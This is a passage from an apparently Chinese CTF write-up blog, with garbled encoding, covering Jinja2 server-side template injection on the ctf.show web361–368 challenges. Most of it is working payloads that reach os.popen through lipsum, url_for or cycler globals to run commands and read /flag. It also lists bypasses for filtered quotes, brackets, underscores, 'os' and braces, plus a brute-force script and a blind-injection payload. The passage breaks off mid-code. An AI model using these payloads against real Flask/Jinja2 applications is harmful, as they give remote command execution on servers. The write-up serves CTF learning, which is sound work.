class="line">escape()æˆ–eè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚</span><br><span class="line"></span><br><span class="line">safe()ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š &#123; &#123;<span class="string">&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;</span>|safe&#125; &#125;ï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>()å°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›</span><br><span class="line"></span><br><span class="line">string()å°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">join()å°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">abs</span>()è¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›</span><br><span class="line"></span><br><span class="line">first()è¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›</span><br><span class="line"></span><br><span class="line">last()è¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">format</span>(value,arags,*kwargs)æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š&#123; &#123;<span class="string">&quot;%s&quot;</span> - <span class="string">&quot;%s&quot;</span>|<span class="built_in">format</span>(<span class="string">&#x27;Hello?&#x27;</span>,<span class="string">&quot;Foo!&quot;</span>) &#125; &#125;å°†è¾“å‡ºï¼šHelloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()è¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span>()è¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›</span><br><span class="line"></span><br><span class="line">sort()è¿”å›æ’åºåçš„åˆ—è¡¨ï¼›</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)å¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default(<span class="string">&#x27;xiaotuo&#x27;</span>)----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=<span class="literal">False</span>é»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨<span class="keyword">or</span>æ¥æ›¿æ¢ã€‚</span><br><span class="line"></span><br><span class="line">length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æ³¨å…¥æ€è·¯ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>éšä¾¿æ‰¾ä¸€ä¸ªå†…ç½®ç±»å¯¹è±¡ç”¨__class__æ‹¿åˆ°ä»–æ‰€å¯¹åº”çš„ç±»</span><br><span class="line"><span class="number">2.</span>ç”¨__bases__æ‹¿åˆ°åŸºç±»ï¼ˆ&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;ï¼‰</span><br><span class="line"><span class="number">3.</span>ç”¨__subclasses__()æ‹¿åˆ°å­ç±»åˆ—è¡¨</span><br><span class="line"><span class="number">4.</span>åœ¨å­ç±»åˆ—è¡¨ä¸­ç›´æ¥å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»getshell</span><br><span class="line"></span><br><span class="line">å¯¹è±¡â†’ç±»â†’åŸºæœ¬ç±»â†’å­ç±»â†’__init__æ–¹æ³•â†’__globals__å±æ€§â†’__builtins__å±æ€§â†’<span class="built_in">eval</span>å‡½æ•°</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p>åå­—å°±æ˜¯è€ƒç‚¹ï¼Œä¼ å…¥nameå°è¯•ã€‚<br>æ ¹æ®ä¸Šå›¾ï¼Œæ¨æµ‹å¯èƒ½æ˜¯twigå’ŒJinja2.<br>ç›´æ¥ä¸Špayloadï¼š<br>å¯ä»¥ç”¨Lipsumï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;tac /flag&#x27;</span>).read()&#125; &#125;</span><br></pre></td></tr></table></figure><p>cycler:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;tac /flag&#x27;</span>).read()&#125; &#125;</span><br></pre></td></tr></table></figure><p>æ§åˆ¶å—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; % <span class="built_in">print</span>(url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat ../flag&#x27;).read()&quot;</span>))% &#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨subclassesä¸€ç‚¹ç‚¹æ‰«ä¹Ÿè¡Œï¼Œè¿™é‡Œæ²¡å¿…è¦ã€‚ä½†è¿™é‡Œå†™ä¸€ä¸‹ï¼š<br>åœŸæ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123; %<span class="number">27</span>%<span class="number">27.</span>__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;tac ../flag&#x27;</span>).read()&#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹åœ¨äºéœ€è¦æ‰¾åˆ° ç±» çš„ç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨splmapç¡¬æ‰«ï¼ŒæŒ‡ä»¤å¦‚ä¸‹ã€‚<br>æ³¨æ„ï¼Œè¿™ä¸ªè„šæœ¬éœ€è¦ä½¿ç”¨python2ä½¿ç”¨ï¼Œè€Œä¸”åé¢çš„æŒ‡ä»¤éƒ½æ²¡æœ‰åŠ ä¸Šï¼Œè¦æ³¨æ„ï¼Œå¦‚æœä½ æƒ³ä½¿ç”¨è¯¥è„šæœ¬å¯ä»¥æŒ‰ç…§å¦‚ ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ./splmap.py -u <span class="string">&#x27;ç›®æ ‡åœ°å€&#x27;</span> --os-shell</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œéœ€è¦åˆ°è¾¾è¯¥æ–‡ä»¶æ ¹ç›®å½•ã€‚<br>ç„¶åå°±è‡ªåŠ¨è¿›å…¥å‘½ä»¤è¡Œå°±å¯ä»¥æŸ¥çœ‹æ–‡ä»¶äº†ã€‚</p><h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;tac /flag&#x27;</span>).read()&#125; &#125;</span><br></pre></td></tr></table></figure><h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><h3 id="è¿‡æ»¤å•åŒå¼•å·"><a href="#è¿‡æ»¤å•åŒå¼•å·" class="headerlink" title="è¿‡æ»¤å•åŒå¼•å·"></a>è¿‡æ»¤å•åŒå¼•å·</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__[request.args.a].popen(request.args.b).read()&#125; &#125;&amp;a=os&amp;b=tac /flag</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼š<br>æ‹¼æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(config.__str__()[<span class="number">2</span>])</span><br><span class="line">(config.__str__()[<span class="number">42</span>])</span><br><span class="line"></span><br><span class="line">?name=&#123; &#123;url_for.__globals__[(config.__str__()[<span class="number">2</span>])%2B(config.__str__()[<span class="number">42</span>])]&#125; &#125;</span><br><span class="line">ç­‰äº</span><br><span class="line">?name=&#123; &#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>]&#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chræ‹¼æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; % <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> % &#125;&#123; % <span class="built_in">print</span>  url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]% &#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å™¨æ‹¼æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string)[<span class="number">24</span>]</span><br></pre></td></tr></table></figure><h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><h3 id="è¿‡æ»¤args"><a href="#è¿‡æ»¤args" class="headerlink" title="è¿‡æ»¤args"></a>è¿‡æ»¤args</h3><p>å¯ä»¥ä½¿ç”¨<code>values</code>è·å–æ‰€æœ‰å‚æ•°ï¼Œæ¥ç»•è¿‡argsï¼Œå½“ç„¶cookieä¹Ÿè¡Œï¼Œæ³¨æ„cookieåˆ†å‰²æ˜¯åˆ†å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__[request.cookies.a].popen(request.cookies.b).read()&#125; &#125;</span><br><span class="line">Cookieï¼ša=os;b=tac /flag</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__.os.popen(request.values.a).read()&#125; &#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><blockquote><p>ç›¸å…³wpï¼š<a href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p></blockquote><h2 id="å­—ç¬¦ä¸²å˜é‡å˜é‡ç»•è¿‡æ–¹æ³•"><a href="#å­—ç¬¦ä¸²å˜é‡å˜é‡ç»•è¿‡æ–¹æ³•" class="headerlink" title="å­—ç¬¦ä¸²å˜é‡å˜é‡ç»•è¿‡æ–¹æ³•"></a>å­—ç¬¦ä¸²å˜é‡å˜é‡ç»•è¿‡æ–¹æ³•</h2><blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p></blockquote><p>æ‹¼æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;cla&quot;</span>+<span class="string">&quot;ss&quot;</span></span><br></pre></td></tr></table></figure><p>åè½¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><em>åœ¨jinjia2é‡Œé¢ï¼Œâ€œclaâ€â€ssâ€æ˜¯ç­‰åŒäºâ€classâ€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿™æ ·å¼•ç”¨classï¼Œå¹¶ä¸”ç»•è¿‡å­—ç¬¦ä¸²è¿‡æ»¤</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__ssalc__&quot;</span>][::-<span class="number">1</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>asciiè½¬æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>)=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)=<span class="string">&#x27;__class__&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¼–ç ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__class__&quot;</span>==<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>==<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span></span><br><span class="line">å¯¹äºpython2çš„è¯ï¼Œè¿˜å¯ä»¥åˆ©ç”¨base64è¿›è¡Œç»•è¿‡</span><br><span class="line"><span class="string">&quot;__class__&quot;</span>==(<span class="string">&quot;X19jbGFzc19f&quot;</span>).decode(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure><p>chrå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; % <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span> % &#125;</span><br><span class="line">&#123; &#123;<span class="string">&quot;&quot;</span>[<span class="built_in">chr</span>(<span class="number">95</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">95</span>)]&#125; &#125;</span><br></pre></td></tr></table></figure><p>åœ¨jinja2é‡Œé¢å¯ä»¥åˆ©ç”¨~è¿›è¡Œæ‹¼æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> a=<span class="string">&#x27;__cla&#x27;</span> % &#125;&#123; %<span class="built_in">set</span> b=<span class="string">&#x27;ss__&#x27;</span>% &#125;&#123; &#123;<span class="string">&quot;&quot;</span>[a~b]&#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤§å°å†™è½¬æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__CLASS__&quot;</span>.lower()]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>)|join</span><br><span class="line">[<span class="string">&quot;__CLASS__&quot;</span>|lower</span><br><span class="line"><span class="string">&quot;__claee__&quot;</span>|replace(<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;ss&quot;</span>) </span><br><span class="line"><span class="string">&quot;__ssalc__&quot;</span>|reverse</span><br><span class="line"><span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">15</span>]~</span><br><span class="line">(()|select|string)[<span class="number">20</span>]~</span><br><span class="line">(()|select|string)[<span class="number">6</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span>(__clas=a,s__=b)|join</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·å–é”®å€¼æˆ–è€…ä¸‹æ ‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"><span class="built_in">dict</span>.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>.pop(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>.get(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>.setdefault(<span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span>[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">list</span>.__getitem__(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">list</span>.pop(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è·å–å±æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__</span><br><span class="line">()[<span class="string">&quot;__class__&quot;</span>]</span><br><span class="line">()|attr(<span class="string">&quot;__class__&quot;</span>)</span><br><span class="line">().__getattribute__(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><h3 id="è¿‡æ»¤ä¸­æ‹¬å·"><a href="#è¿‡æ»¤ä¸­æ‹¬å·" class="headerlink" title="è¿‡æ»¤ä¸­æ‹¬å·"></a>è¿‡æ»¤ä¸­æ‹¬å·</h3><p>ä¸Šé¢˜çš„valueå¯ä»¥ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum.__globals__.os.popen(request.values.a).read()&#125; &#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><p>cookieä¹Ÿå¯ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125; &#125;</span><br><span class="line">Cookie:c=cat /flag</span><br></pre></td></tr></table></figure><p>å¸¸è§„ï¼Œç”¨<code>__getitem__()</code>æ¥ä»£æ›¿[]<br>ç›´æ¥ç”¨<code>__getitem__(1)</code>ä»£æ›¿<code>[1]</code><br>æˆ–è€…ç›´æ¥æ„å»ºä»»æ„å­—ç¬¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;config.__str__().__getitem__(<span class="number">22</span>)&#125; &#125;   <span class="comment"># å°±æ˜¯22</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># anthor:ç§€å„¿</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080/?name=&#123; &#123;config.__str__().__getitem__(%d)&#125; &#125;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        r=requests.get(url=url%(i))</span><br><span class="line">        location=r.text.find(<span class="string">&quot;&lt;h3&gt;&quot;</span>)</span><br><span class="line">        word=r.text[location+<span class="number">4</span>:location+<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> word==j:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;config.__str__().__getitem__(%d) == %s&quot;</span>%(i,j))</span><br><span class="line">            result+=<span class="string">&quot;config.__str__().__getitem__(%d)~&quot;</span>%(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result[:<span class="built_in">len</span>(result)-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;url_for.__globals__.os.popen(config.__str__().__getitem__(<span class="number">22</span>)~config.__str__().__getitem__(<span class="number">40</span>)~config.__str__().__getitem__(<span class="number">23</span>)~config.__str__().__getitem__(<span class="number">7</span>)~config.__str__().__getitem__(<span class="number">279</span>)~config.__str__().__getitem__(<span class="number">4</span>)~config.__str__().__getitem__(<span class="number">41</span>)~config.__str__().__getitem__(<span class="number">40</span>)~config.__str__().__getitem__(<span class="number">6</span>)</span><br><span class="line">).read()&#125; &#125;</span><br></pre></td></tr></table></figure><h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><h3 id="è¿‡æ»¤ä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤ä¸‹åˆ’çº¿" class="headerlink" title="è¿‡æ»¤ä¸‹åˆ’çº¿"></a>è¿‡æ»¤ä¸‹åˆ’çº¿</h3><p>ç”¨è¿‡æ»¤å™¨ä»£æ›¿ï¼š<code>&#123; &#123;XXX|attr(request.args.AAA)|attr(reequest.args.BBB)&#125; &#125;</code><br>values</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.cmd)|attr(request.values.f)()&#125; &#125;&amp;cmd=cat /flag&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;f=read</span><br></pre></td></tr></table></figure><p>cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125; &#125;</span><br><span class="line"></span><br><span class="line">cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><h2 id="è¿‡æ»¤os"><a href="#è¿‡æ»¤os" class="headerlink" title="è¿‡æ»¤os"></a>è¿‡æ»¤os</h2><p>ä½†æ˜¯ä¹Ÿåªæ˜¯nameè¿‡æ»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125; &#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><h3 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤ { {"></a>è¿‡æ»¤ <code>&#123; &#123;</code></h3><p>æ§åˆ¶å—ä»£æ›¿<code>&#123; %</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; %<span class="built_in">print</span>(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() % &#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><p>ç›²æ³¨ä¹Ÿå¯ä»¥ï¼š<br><code>open(&#39;/flag&#39;).read()</code>æ˜¯å›æ˜¾æ•´ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯readå‡½æ•°é‡ŒåŠ ä¸Šå‚æ•°ï¼š<code>open(&#39;/flag&#39;).read(1)</code>ï¼Œè¿”å›çš„å°±æ˜¯è¯»å‡ºæ‰€è¯»çš„æ–‡ä»¶é‡Œçš„iä¸ªå­—ç¬¦ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå°±å¯ä»¥ç›²æ³¨å‡ºäº†<br>æµ‹è¯•payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123; &#123; % <span class="built_in">set</span> a=(lipsum|attr(request.values.a)).get(request.values.b).<span class="built_in">open</span>(request.values.c).read(<span class="number">1</span>) % &#125; &#125;&#123; &#123; % <span class="keyword">if</span> a==request.values.d % &#125; &#125;H3llo&#123; &#123; % endif % &#125; &#125;</span><br><span class="line">&amp;a=__globals__</span><br><span class="line">&amp;b=__builtins__</span><br><span class="line">&amp;c=/flag</span><br><span class="line">&amp;d=c</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨è„šæœ¬ä¸­å°±ä¸ç”¨ç®¡ä¸¤ä¸ªå‰æ‹¬å·ï¼Œä½†æ˜¯æµ‹è¯•payloadé‡Œé¢å¿…é¡»è¦ç©ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 